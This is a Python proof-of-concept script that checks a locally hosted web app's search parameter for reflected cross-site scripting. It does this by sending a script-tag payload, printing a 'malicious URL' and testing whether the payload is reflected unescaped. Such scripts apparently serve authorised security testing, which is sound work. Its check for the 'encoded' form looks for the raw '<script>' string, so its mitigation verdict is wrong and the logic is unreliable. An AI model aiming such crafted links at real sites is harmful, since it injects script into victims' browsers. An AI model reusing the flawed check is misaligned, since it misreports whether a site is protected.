#!/usr/bin/env python3
"""
Reflected XSS - Search Parameter
Target: /search?q=
Payload: <script>alert('Reflected XSS')</script>
"""
import requests
import sys
from urllib.parse import quote

BASE_URL = "http://localhost:3000"
SEARCH_PAGE = f"{BASE_URL}/search"

# Reflected XSS payload
payload = "<script>alert('Reflected XSS')</script>"
encoded_payload = quote(payload)

# Craft the malicious URL
malicious_url = f"{SEARCH_PAGE}?q={encoded_payload}"

print(f"[*] Target page: {SEARCH_PAGE}")
print(f"[*] Payload: {payload}")
print(f"[*] Malicious URL: {malicious_url}")

# Fetch the search results page with payload
response = requests.get(SEARCH_PAGE, params={"q": payload})
print(f"[*] Status: {response.status_code}")

# Check if payload is reflected unescaped
if payload in response.text:
    print("[+] SUCCESS: Payload reflected unescaped in response!")
    print("[+] Reflected XSS confirmed - victim clicking link would execute script")
    sys.exit(0)
else:
    print("[-] Payload not found in response (may be encoded/blocked)")
    # Check for encoded version
    if "<script>" in response.text:
        print("[*] Payload HTML-encoded - XSS mitigated")
    sys.exit(1)